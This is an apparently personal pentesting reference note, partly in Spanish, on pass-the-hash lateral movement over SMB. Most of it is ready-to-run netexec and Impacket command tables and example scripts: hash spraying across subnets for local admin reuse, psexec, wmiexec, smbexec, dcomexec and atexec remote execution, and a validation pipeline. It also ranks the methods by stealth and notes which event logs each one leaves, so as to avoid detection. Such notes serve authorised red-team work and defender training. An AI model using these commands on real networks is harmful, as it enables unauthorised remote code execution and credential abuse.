---
aliases:
  - PtH SMB
  - psexec PtH
  - wmiexec PtH
  - smbexec PtH
  - dcomexec PtH
tags:
  - type/technique
  - technique/lateral-movement
  - technique/credential-access
  - asset/active-directory
  - cred/ntlm
primary categories: null
secondary categories: null
tertiary categories: null
type: Technique
linked:
  - '[[Pass-the-Hash]]'
---
# Pass-the-Hash - SMB Lateral

***

## netexec / crackmapexec

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc smb <target> -u user -H <NT>` | Validate hash + banner | Pre-attack check. |
| `nxc smb <target> -u user -H <NT> -d corp.local` | Domain auth | Standard. |
| `nxc smb <target> -u admin -H <NT> --local-auth` | Local SAM auth (no domain) | Local admin reuse. |
| `nxc smb <range> -u admin -H <NT> --local-auth` | Spray local admin | Hash reuse hunt. |
| `nxc smb <target> -u user -H <NT> --shares` | List shares con priv | Recon. |
| `nxc smb <target> -u user -H <NT> --sessions --loggedon-users` | Sessions activas | Pivot prep. |
| `nxc smb <target> -u user -H <NT> -x 'whoami /all'` | RCE via WMI (default) | Standard exec. |
| `nxc smb <target> -u user -H <NT> -X '<PowerShell payload>'` | PowerShell execution | Alt. |
| `nxc smb <target> -u user -H <NT> --exec-method smbexec` | Force smbexec method | Alt method. |
| `nxc smb <target> -u user -H <NT> --exec-method atexec` | Force atexec (scheduled task) | Alt. |
^pth-smb-nxc

**Hash spray local admin (más común):** local Administrator pwd reusado entre hosts = `nxc smb <range> -u administrator -H <NT> --local-auth`. Output `(Pwn3d!)` = hash válido + admin.

```bash
# Validate single host
nxc smb 10.10.10.5 -u administrator -H aabbccdd1122334455... --local-auth

# Spray range
nxc smb 10.10.10.0/24 -u administrator -H aabbccdd... --local-auth | grep "Pwn3d"
```

___

## Impacket-PsExec

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-psexec -hashes :<NT> corp.local/user@<target>` | Drop binary + create service + RCE | Standard but loud. |
| `impacket-psexec -hashes :<NT> -k -no-pass corp.local/user@<target>` | Kerberos auth (con TGT) | OPSEC. |
| `impacket-psexec -hashes :<NT> -file payload.exe corp.local/user@<target>` | Custom binary upload | Targeted. |
| `impacket-psexec -hashes :<NT> -service-name <custom> corp.local/user@<target>` | Custom service name | Stealth. |
^pth-smb-psexec

**Cuando usar:** SYSTEM shell directo. Requiere SMB admin + write a `ADMIN$` + service create.

**Caveats:**
- Crea binario en `C:\Windows\<random>.exe` (drop) + service efímero.
- Logs Event 7045 (service install) y 4624 (logon type 3).
- Más detectado de los 4 métodos.

```bash
impacket-psexec -hashes :aabbccdd... corp.local/atacante@10.10.10.5
# Output: SYSTEM shell interactive
```

___

## Impacket-WMIExec

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-wmiexec -hashes :<NT> corp.local/user@<target>` | RCE via WMI (`Win32_Process.Create`) | Less noisy que psexec. |
| `impacket-wmiexec -hashes :<NT> -k -no-pass corp.local/user@<target>` | Kerberos auth | OPSEC. |
| `impacket-wmiexec -hashes :<NT> corp.local/user@<target> 'whoami'` | Single command (no shell) | Quick. |
| `impacket-wmiexec -hashes :<NT> corp.local/user@<target> -shell-type powershell` | PowerShell shell | PS-friendly. |
^pth-smb-wmiexec

**Cuando usar:** stealth lateral. Sin drop binary, sin service create. Output via SMB share `ADMIN$`.

**Caveats:**
- Requiere SMB admin (RCE output via `\\target\ADMIN$\<random>`).
- WMI events 5857/5858 si auditing habilitado.
- Más silencioso que psexec — preferred método modern.

___

## Impacket-SMBExec

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-smbexec -hashes :<NT> corp.local/user@<target>` | RCE via service create + named pipe (sin drop binary) | Stealth psexec alt. |
| `impacket-smbexec -hashes :<NT> -k -no-pass corp.local/user@<target>` | Kerberos | OPSEC. |
| `impacket-smbexec -hashes :<NT> -shell-type powershell corp.local/user@<target>` | PS shell | PS-friendly. |
^pth-smb-smbexec

**Cuando usar:** psexec pero sin drop binary visible. Crea service efímero pero usa named pipe en lugar de `\\target\ADMIN$\<random>.exe`.

**Caveats:**
- Service create logged (Event 7045).
- Sin file drop = forensic-cleaner.
- Slower que wmiexec por overhead service.

___

## Impacket-DComExec

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-dcomexec -hashes :<NT> -object MMC20 corp.local/user@<target>` | RCE via MMC20.Application DCOM | Stealth máximo. |
| `impacket-dcomexec -hashes :<NT> -object ShellWindows corp.local/user@<target>` | ShellWindows DCOM | Alt object. |
| `impacket-dcomexec -hashes :<NT> -object ShellBrowserWindow corp.local/user@<target>` | ShellBrowserWindow | Alt. |
| `impacket-dcomexec -hashes :<NT> -k -no-pass corp.local/user@<target>` | Kerberos | OPSEC. |
^pth-smb-dcomexec

**Cuando usar:** máximo stealth. Sin SMB share writes, sin service create. Solo DCOM call.

**Caveats:**
- Requiere DCOM permissions en target (`Distributed COM Users` group o local admin).
- Firewall: TCP 135 + dynamic RPC range (49152-65535).
- Output lectura via WMI namespace.
- Menos detección signature.

___

## Impacket-AtExec

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-atexec -hashes :<NT> corp.local/user@<target> 'whoami'` | RCE via scheduled task | Single command. |
| `impacket-atexec -hashes :<NT> -k -no-pass corp.local/user@<target> '<cmd>'` | Kerberos | OPSEC. |
^pth-smb-atexec

**Cuando usar:** psexec/wmiexec/smbexec/dcomexec todos blocked. Crea scheduled task → trigger → output via SMB.

**Caveats:**
- Lento (1-min schedule + execution + cleanup).
- Service-style detection signature.
- Backup method.

___

## Method Comparison

| **Method** | **Stealth** | **Speed** | **Reliability** | **Logs principales** |
|:---:|:---:|:---:|:---:|:---:|
| **psexec** | Low | Fast | High | 7045, 4624, file drop. |
| **wmiexec** | High | Fast | High | 5857/5858 (if WMI audit). |
| **smbexec** | Medium | Medium | High | 7045, no file drop. |
| **dcomexec** | High | Medium | Medium (DCOM perms) | DCOM events si audit. |
| **atexec** | Medium | Slow | Medium | 4698 (task create). |
^pth-smb-comparison

**Recomendación general:**
- **wmiexec** = default modern.
- **dcomexec** = stealth max si DCOM access.
- **psexec** = solo si otros bloqueados.

___

## Pre-PtH Validation

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc smb <target> -u user -H <NT>` | Quick auth check (no execution) | Pre-attack. |
| `nxc smb <target> -u user -H <NT> --pass-pol` | Validar + leer password policy | Pre-attack. |
| `nxc smb <target> -u user -H <NT> --shares` | List shares accesibles | Recon. |
| `nxc winrm <target> -u user -H <NT>` | WinRM access check | Alt path validation. |
^pth-smb-validate

```bash
# Pre-attack validation pipeline
TARGET=10.10.10.5
USER=atacante
NT=aabbccdd1122334455...

nxc smb $TARGET -u $USER -H $NT  # validate
nxc smb $TARGET -u $USER -H $NT --shares  # share access
nxc smb $TARGET -u $USER -H $NT --sessions  # sessions activas
```

***
